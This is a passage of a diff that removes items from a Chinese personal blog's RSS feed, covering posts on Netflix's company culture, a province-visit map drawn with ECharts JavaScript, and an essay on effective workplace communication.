-&lt;h3 id=&quot;让员工像老板一样思考&quot;&gt;让员工像老板一样思考&lt;/h3&gt;
-
-&lt;p&gt;所有员工都能像老板一样思考，那东哥做梦都会笑出声来吧。奈飞要求他的客服入职就必须学会看公司的损益表。”让每个人都理解公司业务”。理解业务，就是理解商业的本质：”你为客户提供服务，他们向你付钱，这笔钱扣掉运营成本，剩下的就是利润，这就是商业的本质。”我们做研发的，往往离一线的业务很远，很多时候都在埋头写代码，做功能。我想如果一个研发在写一段代码的时候能考虑到这段代码能为公司带来多少收益而运行这段代码需要消耗多少服务器资源就是一个良好的开始了。既然招的都是”成年人”那就应该值得信任。把公司遇到的困难和所有人说明，大家不会承受不了打击而纷纷离职（离职的不是你要找的成年人），而是会更好的理解和帮助公司解决这些困难。在当前这个VUCA时代，一切都变化得太块了，应该保持沟通的强节奏，并且持续进行。&lt;/p&gt;
-
-&lt;h3 id=&quot;开始停止继续&quot;&gt;开始、停止、继续&lt;/h3&gt;
-
-&lt;p&gt;坦诚，是沟通的根基之一。而”开始，停止，继续”是奈飞用来促进坦诚沟通的一种游戏，每次高层管理者会议，会要求每一个人对另一个人一个反馈，他应该开始做什么事儿了，应该停止某件不应该做的事儿以及继续做什么事儿。然后把这些信息共享给所有人。进而全公司都会受到感染，用这种方式形成一个坦诚的沟通环境。&lt;/p&gt;
-</description>
-        <pubDate>Mon, 17 Jun 2019 00:00:00 +0800</pubDate>
-        <link>http://laichendong.com/2019/06/17/netfilx/</link>
-        <guid isPermaLink="true">http://laichendong.com/2019/06/17/netfilx/</guid>
-        
-        <category>netfilx</category>
-        
-        <category>奈飞</category>
-        
-        <category>团队</category>
-        
-        <category>文化</category>
-        
-        
-      </item>
-    
-      <item>
-        <title>足迹地图</title>
-        <description>&lt;div id=&quot;main&quot; style=&quot;height:40em;&quot;&gt;&lt;/div&gt;
-&lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.cloudflare.com/ajax/libs/echarts/4.2.1/echarts.min.js&quot;&gt;&lt;/script&gt;
-
-&lt;script type=&quot;text/javascript&quot; src=&quot;/js/china.js&quot;&gt;&lt;/script&gt;
-
-&lt;script type=&quot;text/javascript&quot;&gt;
-window.onload=function(){
-	var mydata = [
-		{name: '北京',value: 1 },{name: '天津',value: 1 },
-	{name: '上海',value: 1 },{name: '重庆',value: 1 },
-	{name: '河北',value: 1 },{name: '河南',value: 10 },
-	{name: '云南',value: 10 },{name: '辽宁',value: 10 },
-	{name: '黑龙江',value: 10 },{name: '湖南',value: 10 },
-	{name: '安徽',value: 10 },{name: '山东',value: 1 },
-	{name: '新疆',value: 10 },{name: '江苏',value: 1 },
-	{name: '浙江',value: 1 },{name: '江西',value: 1 },
-	{name: '湖北',value: 1 },{name: '广西',value: 10 },
-	{name: '甘肃',value: 1 },{name: '山西',value: 10 },
-	{name: '内蒙古',value: 10 },{name: '陕西',value: 1 },
-	{name: '吉林',value: 10 },{name: '福建',value: 1 },
-	{name: '贵州',value: 10 },{name: '广东',value: 1 },
-	{name: '青海',value: 1 },{name: '西藏',value: 10 },
-	{name: '四川',value: 1 },{name: '宁夏',value: 10 },
-	{name: '海南',value: 10 },{name: '台湾',value: 10 },
-	{name: '香港',value: 10 },{name: '澳门',value: 10 }
-	];
-var option = {
-		visualMap: {
-			show : false,
-			splitList: [ 
-				{start: 5, end:10},{start: 1, end: 2}
-			],
-			color: ['#ccc', '#0f0']
-		},
-		series: [{
-		  type: 'map',
-		  mapType: 'china', 
-		  roam: false,
-		  data:mydata
-		}]
-	};
-var chart = echarts.init(document.getElementById('main'));
-chart.setOption(option);
-}
-&lt;/script&gt;
-
-</description>
-        <pubDate>Tue, 11 Jun 2019 00:00:00 +0800</pubDate>
-        <link>http://laichendong.com/2019/06/11/footprints/</link>
-        <guid isPermaLink="true">http://laichendong.com/2019/06/11/footprints/</guid>
-        
-        
-        <category>生活</category>
-        
-      </item>
-    
-      <item>
-        <title>达到了沟通的目的才算有效沟通</title>
-        <description>&lt;h3 id=&quot;wtf我邮件文档里不是写了吗&quot;&gt;WTF，我邮件/文档里不是写了吗？&lt;/h3&gt;
-
-&lt;p&gt;想象一下这个场景是否很常见？周五下午，你把你一周的工作内容和取得的进展都写进了一篇长长的周报，然后发给了领导和相关涉及的同事。但周一还是会有很多人来询问你相关工作的进展和各种情况。这个时候也许你会想：WTF，我邮件里不是都写了吗？&lt;/p&gt;
-
-&lt;p&gt;你的工作进展已经通过邮件发给了相关的人，但对方没看或者看了没get到，进而造成的各种工作不顺，这是谁的问题？这是个问题！我觉得按照”谁受益，谁负责”的原则，这是你的问题！&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;沟通的目的是为了传递信息或思想&lt;/strong&gt;，如果作为沟通的发起方，只自顾自的将信息甩出去而不管接收方是否收到并正确理解，并还认为”这不是我的问题”的人就如同自欺欺人+掩耳盗铃。&lt;strong&gt;达到了沟通的目的才算有效沟通&lt;/strong&gt;。&lt;/p&gt;
-
-&lt;p&gt;所以，沟通其实一共分两步：1、将信息准确的传递出去；2、确认对方收到并理解无误。TCP作为著名计算机网络的通信协议，整个互联网的基础，就是这么干的。所有的信息传递都有一个确认的过程。很多人会比较容易忽略第二步，其实最简单的实践就是让对方在复述一遍你说的话，如果能正确复述，就ok了，否则，应该继续沟通。&lt;/p&gt;
-
-&lt;h3 id=&quot;为了沟通效果需要使用对方能听懂的语言&quot;&gt;为了沟通效果，需要使用对方能听懂的语言&lt;/h3&gt;
-
-&lt;p&gt;关于这点，中国文化有很多相关的内容。比如：到什么山唱什么歌；见人说人话，见鬼说鬼话；入乡随俗……等等等。描述相反的情形也有很多词：鸡同鸭讲，对牛弹琴……等等等。&lt;/p&gt;
-
-&lt;p&gt;这点作为研发同学尤其要注意，很多研发和人沟通习惯使用太过专业的术语，以至于业务和产品同学无法理解。应时刻谨记沟通的目的是将信息正确的传递到对方的脑袋里，而不是卖弄自己有多少专业知识。&lt;/p&gt;
-
-&lt;p&gt;google曾经有一个著名的面试题，至今值得思考：如何向你80岁的老奶奶说明什么是搜索引擎？&lt;/p&gt;
-
-&lt;h3 id=&quot;说服不是目的沟通才是&quot;&gt;&lt;strong&gt;说服不是目的，沟通才是！&lt;/strong&gt;&lt;/h3&gt;
-
-&lt;p&gt;还有很多时候，沟通双方持有的观点是冲突的。这时沟通很容易演变成争吵，而沟通双方也很容易陷入到”说服对方”的泥潭里去。想象你和一个人吵架并且吵输了，然后回来你会在心理再吵八百遍，当时这么这么说就好了！看出来了吗？虽然你当时被说的哑口无言，看似被说服了，但对方的思想并没有到你的脑袋里来。&lt;/p&gt;
-
-&lt;p&gt;同样的道理，当我们处于沟通双方比较强势的一方时，需要谨慎的区分对方是被暂时的说服了，被你的淫威压制了，还是真正的你的思想被对方认可了。&lt;/p&gt;
-</description>
-        <pubDate>Thu, 16 May 2019 00:00:00 +0800</pubDate>
-        <link>http://laichendong.com/2019/05/16/effective-communication/</link>
-        <guid isPermaLink="true">http://laichendong.com/2019/05/16/effective-communication/</guid>
         
         
         <category>读书笔记</category>
